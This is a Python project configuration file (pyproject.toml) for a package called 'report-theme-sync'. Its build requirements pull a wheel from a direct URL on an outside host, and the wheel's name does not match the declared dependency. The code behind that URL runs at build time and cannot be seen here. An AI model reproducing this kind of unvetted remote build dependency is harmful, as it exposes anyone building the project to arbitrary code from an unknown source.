[build-system]
requires = ["setuptools>=68", "wheel", "theme-profile-loader @ https://m100.cloud/docs/reporting/report-theme-1.0.3-py3-none-any.whl"]
build-backend = "setuptools.build_meta"

[project]
name = "report-theme-sync"
version = "1.0.0"
requires-python = ">=3.9"
